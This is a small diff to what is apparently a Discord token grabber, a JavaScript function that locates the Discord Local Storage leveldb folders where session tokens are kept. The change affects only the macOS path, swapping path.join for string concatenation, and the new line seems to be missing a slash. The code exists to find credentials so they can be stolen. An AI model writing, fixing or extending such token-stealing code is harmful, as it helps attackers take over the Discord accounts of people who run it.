@@ -63,14 +63,15 @@ function discordTokenGrabber() {
     }
   } else if (computerPlatform == 'darwin') {
     paths = {
-      Discord: path.join(
+      Discord:
+        process.env.HOME + 'Library/Application Support/discord/Local Storage/leveldb' /* path.join(
         process.env.HOME,
         'Library',
         'Application Support',
         'discord',
         'Local Storage',
         'leveldb'
-      ),
+      )*/,
       'Discord Canary': path.join(
         process.env.HOME,
         'Library',
